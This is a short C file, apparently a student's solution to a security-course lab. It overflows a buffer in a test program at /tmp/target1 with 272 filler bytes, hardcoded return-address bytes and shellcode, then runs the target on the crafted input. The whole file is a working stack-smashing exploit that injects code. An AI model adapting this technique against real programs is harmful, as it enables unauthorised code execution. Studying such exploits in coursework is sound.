#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target1"
#define DEFAULT_OUTPUT "/tmp/xploit1_output"
#define NUM 272


int main(int argc, char *argv[])
{
  // \xa5\x51\x55\x55\x55\x55\x55\x00
  // TODO determine exploit length
  char exploit[NUM + 8 + sizeof shellcode];

  // TODO fill exploit buffer
  memset(exploit, 1, NUM);
  strcpy(exploit + NUM, "\x55\x55\x55\x00");
  strcpy(exploit + NUM + 4, "\xa5\x51\x55\x55");
  strcpy(exploit + NUM + 8, shellcode);

  // Write the exploit buffer to a file
  write_xploit(exploit, sizeof(exploit), DEFAULT_OUTPUT);

  char *args[] = { TARGET, DEFAULT_OUTPUT, NULL };
  char *env[] = { NULL };


  execve(TARGET, args, env);
  perror("execve failed");

  return 0;
}

